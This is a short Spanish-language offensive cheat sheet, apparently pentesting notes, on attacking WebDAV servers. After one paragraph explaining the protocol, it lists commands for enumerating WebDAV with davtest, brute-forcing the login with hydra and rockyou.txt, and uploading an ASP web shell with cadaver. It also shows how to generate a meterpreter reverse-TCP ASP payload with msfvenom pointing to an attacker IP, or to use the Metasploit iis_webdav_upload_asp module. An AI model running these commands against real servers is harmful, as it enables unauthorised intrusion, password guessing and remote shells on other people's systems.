rcWebDAV (Web Distributed Authoring and Versioning) es una extensión del protocolo HTTP (Hypertext Transfer Protocol) que permite a los usuarios gestionar y editar archivos almacenados en servidores remotos. WebDAV fue diseñado para facilitar la colaboración entre usuarios en la creación y edición de contenidos en la web, permitiendo operaciones como la carga y descarga de archivos, la gestión de directorios, y la edición directa de archivos en un servidor.

### Enumeracion webDAV
```bash
# Si se necesita proveer contraseña se mete el argumento -auth
davtest -url <URL/webdav> -auth user:pass
```
### Fuerza bruta contra webdav login panel
```bash
hydra -L usuarios.txt -P rockyou.txt <IP> http-get /webdav/
```

### Web-shell con cadaver
```bash
cadaver <URL/webdav>
put /usr/share/webshells/asp
# con la enumeracion de cadaver se ve el tipo de ficheros que se pueden subir y cuales se pueden ejecutar
```

### Reverse shell en asp con Metasploit
#### Opcion 1
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip_atacante> LPORT=<puerto_atacante> -f asp > shell.asp
cadaver <URL/webdav>
put ./shell.asp


use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST y set LPORT

Visitar el shell.asp desde la web
```

#### Opcion 2
```bash
use exploit/windows/iis/iis_webdav_upload_asp
set payload windows/meterpreter/reverse_tcp
exploit (en lugar de run)
```


